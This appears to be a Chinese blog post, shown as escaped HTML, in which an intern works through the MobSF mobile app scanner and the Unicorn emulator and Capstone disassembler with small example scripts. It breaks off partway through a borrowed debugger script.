    <content type="html"><![CDATA[<p>没想到吧，我又润来学安卓了。。。实习就是这样的啦，多点尝试。</p><span id="more"></span><h1 id="1-MobSF"><a href="#1-MobSF" class="headerlink" title="1. MobSF"></a>1. MobSF</h1><p>MobSF是Mobile Security Framework的缩写，是一个移动端应用安全问题检测的框架和工具，它适用于Android/iOS/Windows，能够执行动态和静态的恶意软件的分析和检测，无论是二进制方式还是压缩的源代码都可以进行检测。静态分析适用于安卓、苹果应用程序，而动态分析暂时只支持安卓应用程序。</p><p>详细安装教程可看官方文档：<a href="https://mobsf.github.io/docs/#/zh-cn/">https://mobsf.github.io/docs/#/zh-cn/</a></p><p>注：Python版本按照上面官方文档下载，安装Python 3.10会出错。</p><p>将APK文件（比如：迅雷安卓移动端）上传到MobSF，并等待它自动分析。分析完成后MobSF后界面如下：</p><img src="/posts/78ecec07/1.1.1.jpg" class="" title="MobSF静态分析界面"><h2 id="1-1-基本信息"><a href="#1-1-基本信息" class="headerlink" title="1.1 基本信息"></a>1.1 基本信息</h2><p>在基本信息那一栏，可以看到该APK的安全得分、文件信息和App信息等。App信息包括了包名和Main Activity等。基本信息中还会给出Activities、Services、Receivers、Providers这四大组件的数目，以及可导出组件的数目。（可导出组件是较为严重的安全漏洞，因此这里单独列出了可导出组件的数目）</p><img src="/posts/78ecec07/1.1.2.jpg" class="" title="基本信息"><h2 id="1-2-扫描信息和反编译代码"><a href="#1-2-扫描信息和反编译代码" class="headerlink" title="1.2 扫描信息和反编译代码"></a>1.2 扫描信息和反编译代码</h2><img src="/posts/78ecec07/1.1.3.jpg" class="" title="扫描信息"><p>可以对APK进行重扫，也可以开始动态分析。动态分析就需要Genymotion模拟器或者真机辅助。点击动态分析，MobSF会将该APK下载至安卓设备中，但目前的APK和真机大多是ARM架构的，所以下载至真机应该没多大问题。但Genymotion是x86架构的，下载ARM架构的APK会导致下载失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ERROR] 26/Jul/2022 15:19:56 - This APK cannot be installed. Is this APK compatible the Android VM/Emulator?</span><br><span class="line">adb install failed</span><br><span class="line">[ERROR] 26/Jul/2022 15:19:56 - Internal Server Error: /android_dynamic/d165c0577f92a5ea85d964d853c6e15d</span><br><span class="line">ERROR:django.request:Internal Server Error: /android_dynamic/d165c0577f92a5ea85d964d853c6e15d</span><br></pre></td></tr></table></figure><p>解决方法是下载安装转换工具<a href="https://github.com/m9rco/Genymotion_ARM_Translation">Genymotion_ARM_Translation</a>，目前只更新到Android 9.0，所以使用的模拟器安卓版本不能太高。据自己的模拟器系统版本下载对应的ZIP包，然后将包直接拖入到模拟器安装，安装完成后重启模拟器即可。</p><p>在MobSF中连接安卓设备，重新选择动态分析，此时成功下载迅雷，进入动态调试界面。</p><img src="/posts/78ecec07/1.1.4.jpg" class="" title="动态分析"><p>同时在Dynamic Analyzer那一栏可以看到APK在模拟器中的安装路径。</p><img src="/posts/78ecec07/1.1.5.jpg" class="" title="动态分析"><p>呃动态分析好像也是MobSF自动分析的。动态分析主要功能如下：</p><div class="table-container"><table><thead><tr><th>功能菜单</th><th>说明</th></tr></thead><tbody><tr><td>Show/Stop Screen</td><td>开启/关闭屏幕</td></tr><tr><td>Install/Remove MobSF RootCA</td><td>安装/卸载MobSF证书</td></tr><tr><td>Set/Unset HTTP(s) Proxy</td><td>设置/取消HTTP(s)代理</td></tr><tr><td>TLS/SSL Security Tester</td><td>TLS/SSL安全测试</td></tr><tr><td>Exported Activity Tester</td><td>测试导出类型的Activity</td></tr><tr><td>Activity Tester</td><td>测试Activity</td></tr><tr><td>Get Dependencies</td><td>获取依赖项</td></tr><tr><td>Take a Screenshot</td><td>截屏</td></tr><tr><td>Logcat Stream</td><td>日志流信息</td></tr><tr><td>Generate Report</td><td>生成动态分析报告</td></tr></tbody></table></div><p>如果APK比较大，在Activity Tester测试时等待时间会比较漫长。</p><p>在反编译代码那一个框里可以查看并下载App的Java代码，或者查看并下载Smali代码，再或者查看Manifest文件。另外，在这部分中也可以动态分析。</p><h2 id="1-3-签名者证书"><a href="#1-3-签名者证书" class="headerlink" title="1.3 签名者证书"></a>1.3 签名者证书</h2><p>这部分主要说明了对该APK签名的签名者信息。</p><img src="/posts/78ecec07/1.1.6.jpg" class="" title="签名者信息"><h2 id="1-4-权限信息"><a href="#1-4-权限信息" class="headerlink" title="1.4 权限信息"></a>1.4 权限信息</h2><p>在权限信息中，罗列了被检测App在Manifest文件中申请的所有权限，并标出了每个权限的危险指数，对于有安全隐患的权限标记为危险。在每个权限后面都加上了该权限的作用简介，并对其功能及安全风险进行了描述。</p><img src="/posts/78ecec07/1.1.7.jpg" class="" title="权限信息"><p>以android.permission.ACCESS_COARSE_LOCATION为例：</p><p>MobSF检测到App请求了这一权限，这项权限用于获取设备的粗略位置信息。MobSF将其标记为dangerous，即认为这项权限是有安全风险的。在描述中介绍了这一权限的功能，可以通过基站定位等方式获取用户位置，恶意程序可以通过该权限来获取用户的大致位置。</p><h2 id="1-5-安卓API"><a href="#1-5-安卓API" class="headerlink" title="1.5 安卓API"></a>1.5 安卓API</h2><img src="/posts/78ecec07/1.1.8.jpg" class="" title="安卓API"><p>上传为安卓应用时展示，列举了被检测App调用的所有安卓API，并给出了调用API的代码的位置，这一功能在代码研究分析时比较实用，但在安全检测分析中实际作用并不大。</p><h2 id="1-6-Browsable-Activities"><a href="#1-6-Browsable-Activities" class="headerlink" title="1.6 Browsable Activities"></a>1.6 Browsable Activities</h2><p>browsable的意思就是浏览器在特定条件下可以打开用户的activity。（这个不太懂）</p><h2 id="1-7-安全分析"><a href="#1-7-安全分析" class="headerlink" title="1.7 安全分析"></a>1.7 安全分析</h2><p>安全分析是MobSF的最重要部分，分为六个分析点，分别是网络安全、Manifest分析、源码分析、二进制分析、NIAP分析和文件分析。</p><img src="/posts/78ecec07/1.1.9.jpg" class="" title="安全分析"><h1 id="2-Unicorn"><a href="#2-Unicorn" class="headerlink" title="2. Unicorn"></a>2. Unicorn</h1><p>Unicorn基于qemu开发，是一个轻量级、多平台、多架构的CPU模拟器框架，可以跨平台执行Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64)等指令集的原生程序，让我们更好地关注CPU操作，忽略机器设备的差异。</p><p>Unicorn安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install unicorn</span><br></pre></td></tr></table></figure><h2 id="2-1-Unicorn的编写"><a href="#2-1-Unicorn的编写" class="headerlink" title="2.1 Unicorn的编写"></a>2.1 Unicorn的编写</h2><p>对于利用Unicorn编写的代码思路一般为：设置好参数-&gt;加载模拟的代码-&gt;添加hook-&gt;run。</p><h3 id="2-1-1-设置参数并加载模拟执行的代码"><a href="#2-1-1-设置参数并加载模拟执行的代码" class="headerlink" title="2.1.1 设置参数并加载模拟执行的代码"></a>2.1.1 设置参数并加载模拟执行的代码</h3><p>头文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *<span class="comment">#调用unicorn库</span></span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *<span class="comment">#我们构造的是x86寄存器，所以还需要使用一些x86寄存器的常量，所以还要调用这个库，同理如果是x64的话就改成unicorn.x64_const</span></span><br></pre></td></tr></table></figure><p>Uc类初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mu = Uc(arch, mode)</span></span><br><span class="line"><span class="comment">#这个Uc类接受两个参数分别是硬件架构(arch)和硬件模式(mode)，在这个样例中我们选用的是X86体系结构和32位代码</span></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br></pre></td></tr></table></figure><p>arch和mode相关常量有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arch:UC_ARCH_ARM、UC_ARCH_ARM64、UC_ARCH_M68K、UC_ARCH_MAX、UC_ARCH_MIPS、UC_ARCH_PPC、UC_ARCH_SPARC、UC_ARCH_X86</span><br><span class="line"></span><br><span class="line">mode:UC_MODE_16、UC_MODE_32、UC_MODE_64、UC_MODE_ARM、UC_MODE_BIG_ENDIAN、UC_MODE_LITTLE_ENDIAN、UC_MODE_MCLASS、UC_MODE_MICRO、UC_MODE_MIPS3、UC_MODE_MIPS32、UC_MODE_MIPS32R6、UC_MODE_MIPS64、UC_MODE_PPC32、UC_MODE_PPC64、UC_MODE_QPX、UC_MODE_SPARC32、UC_MODE_SPARC64、UC_MODE_THUMB、UC_MODE_V8、UC_MODE_V9</span><br></pre></td></tr></table></figure><p>定义虚拟地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADDRESS = <span class="number">0x1000000</span><span class="comment">#注意一定要与0x1000对齐</span></span><br></pre></td></tr></table></figure><p>映射代码内存，所有CPU操作都只能访问此内存，默认权限为rwx。<code>mem_map()</code>函数要求 address 和 size 参数都与0x1000对齐，否则会报UC_ERR_ARG异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_map(ADDRESS, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)<span class="comment">#接受两个参数，分别是地址和大小，要注意地址与大小一定都要是0x1000对齐</span></span><br></pre></td></tr></table></figure><p>把要模拟的代码加载到我们刚刚映射的内存上，<code>mem_write()</code>函数的第二个参数只支持python的byte数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这个有两种实现方式第一种是直接把调试代码写在此代码中，还有一种就是调用此代码外的二进制代码</span></span><br><span class="line"><span class="comment">#第一种:</span></span><br><span class="line">x86_CODE = <span class="string">b&#x27;\x41\x4a&#x27;</span><span class="comment">#这两个x86的指令为“INC ecx”（+1指令）和“DEC edx”（-1指令）</span></span><br><span class="line">mu.mem_write(ADDRESS, x86_CODE)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种:</span></span><br><span class="line">mu.mem_write(ADDRESS, <span class="built_in">open</span>(<span class="string">&#x27;./test&#x27;</span>).read())</span><br></pre></td></tr></table></figure><h3 id="2-1-2-添加指令级的Hook"><a href="#2-1-2-添加指令级的Hook" class="headerlink" title="2.1.2 添加指令级的Hook"></a>2.1.2 添加指令级的Hook</h3><p>这个有点像单步调试的感觉，在begin…end范围内的每一条指令被执行前都会调用callback。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)</span><br></pre></td></tr></table></figure><p><code>hook_code()</code>是Python自带的函数，类似于C语言中的<code>printf()</code>。<code>hook_code()</code>用来跟踪指令的，仅打印指令执行的地址和长度信息。实际应用中可配合capstone反汇编引擎玩一些更骚的操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># callback for tracing instructions</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br></pre></td></tr></table></figure><p><code>UC_HOOK_CODE</code>的callback中可以修改PC或EIP等寄存器来改变程序运行流程。实际上，Unicorn调试器的单步调试就是以这个为基础实现的。</p><h3 id="2-1-3-启动虚拟机"><a href="#2-1-3-启动虚拟机" class="headerlink" title="2.1.3 启动虚拟机"></a>2.1.3 启动虚拟机</h3><p>我们已经映射内存并将数据写入到内存，并设置好执行Hook以监视指令是否正常执行，但是虚拟机还没有启动，所以需要用<code>emu_start()</code>函数来启动虚拟机。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(x86_CODE))</span><br><span class="line"><span class="comment">#这个函数本来是有四个参数的，分别是需要模拟代码的初始地址、结束地址、模拟的时间、模拟的指令数量，我们通常忽略后面两个参数，这样就会在无限的时间中模拟无限数量的指令</span></span><br><span class="line"><span class="comment">#mu.emu_start(self, begin, until, timeout=0, count=0)</span></span><br></pre></td></tr></table></figure><h3 id="2-1-4-获取和修改寄存器内容"><a href="#2-1-4-获取和修改寄存器内容" class="headerlink" title="2.1.4 获取和修改寄存器内容"></a>2.1.4 获取和修改寄存器内容</h3><p>当然对于调试，最重要的就是可以查看和修改寄存器的值，Unicorn也提供了这样的功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line"><span class="comment">#这个函数接受两个参数，分别是寄存器地址（这个在常量中有）、要写入的内容</span></span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="comment">#这个函数只接受一个参数，那就是寄存器地址，返回这个寄存器的内容</span></span><br></pre></td></tr></table></figure><h3 id="2-1-5-上述样例的完整代码"><a href="#2-1-5-上述样例的完整代码" class="headerlink" title="2.1.5 上述样例的完整代码"></a>2.1.5 上述样例的完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line">    </span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line">mu.mem_map(ADDRESS, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">x86_CODE = <span class="string">b&#x27;\x41\x4a&#x27;</span></span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br><span class="line">mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br><span class="line">mu.mem_write(ADDRESS, x86_CODE)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)</span><br><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(x86_CODE))</span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br></pre></td></tr></table></figure><p>运行试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\v5le0n9\Desktop&gt; python unicorn.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;unicorn.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from unicorn import *</span><br><span class="line">  File &quot;C:\Users\v5le0n9\Desktop\unicorn.py&quot;, line 2, in &lt;module&gt;</span><br><span class="line">    from unicorn.x86_const import *</span><br><span class="line">ModuleNotFoundError: No module named &#x27;unicorn.x86_const&#x27;; &#x27;unicorn&#x27; is not a package</span><br><span class="line">PS C:\Users\v5le0n9\Desktop&gt;</span><br></pre></td></tr></table></figure><p>运行错误，这里是一个点，不能将测试文件命名为<code>unicorn.py</code>，因为Unicorn模块中就有一个PY文件叫<code>unicorn.py</code>，导致文件冲突。此时应该修改测试文件名，再次运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python unicorn_test.py</span><br><span class="line">&gt;&gt;&gt; ecx: 0</span><br><span class="line">&gt;&gt;&gt; edx: 0</span><br><span class="line">&gt;&gt;&gt; ecx: 4660</span><br><span class="line">&gt;&gt;&gt; edx: 30864</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x1000000, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; ecx: 4661</span><br><span class="line">&gt;&gt;&gt; edx: 30863</span><br></pre></td></tr></table></figure><h2 id="2-2-Capstone反汇编"><a href="#2-2-Capstone反汇编" class="headerlink" title="2.2 Capstone反汇编"></a>2.2 Capstone反汇编</h2><p>Unicorn 并没有反汇编功能，虽然它的内部一定有与反汇编相关的代码。我们只能自己想办法反汇编。Unicorn 有一个兄弟，它叫Capstone。Capstone是一款支持多种处理器和开发语言的反汇编框架。我将使用Capstone 作为调试模块的反汇编器。</p><p>Capstone安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install capstone</span><br></pre></td></tr></table></figure><h3 id="2-2-1-Capstone例子"><a href="#2-2-1-Capstone例子" class="headerlink" title="2.2.1 Capstone例子"></a>2.2.1 Capstone例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.arm <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">CODE = <span class="string">b&quot;\xf1\x02\x03\x0e\x00\x00\xa0\xe3\x02\x30\xc1\xe7\x00\x00\x53\xe3&quot;</span></span><br><span class="line"> </span><br><span class="line">md = Cs(CS_ARCH_ARM, CS_MODE_ARM)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python capstone_test.py</span><br><span class="line">1000:   mcreq   p2, #0, r0, c3, c1, #7</span><br><span class="line">1004:   mov     r0, #0</span><br><span class="line">1008:   strb    r3, [r1, r2]</span><br><span class="line">100c:   cmp     r3, #0</span><br></pre></td></tr></table></figure><h3 id="2-2-2-UnicornDebbuger调试器"><a href="#2-2-2-UnicornDebbuger调试器" class="headerlink" title="2.2.2 UnicornDebbuger调试器"></a>2.2.2 UnicornDebbuger调试器</h3><p>无名大佬写的调试器，直接拿来用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> arm_const</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> capstone <span class="keyword">as</span> cp</span><br><span class="line"> </span><br><span class="line">BPT_EXECUTE = <span class="number">1</span></span><br><span class="line">BPT_MEMREAD = <span class="number">2</span></span><br><span class="line">UDBG_MODE_ALL = <span class="number">1</span></span><br><span class="line">UDBG_MODE_FAST = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line">REG_ARM = &#123;arm_const.UC_ARM_REG_R0: <span class="string">&quot;R0&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R1: <span class="string">&quot;R1&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R2: <span class="string">&quot;R2&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R3: <span class="string">&quot;R3&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R4: <span class="string">&quot;R4&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R5: <span class="string">&quot;R5&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R6: <span 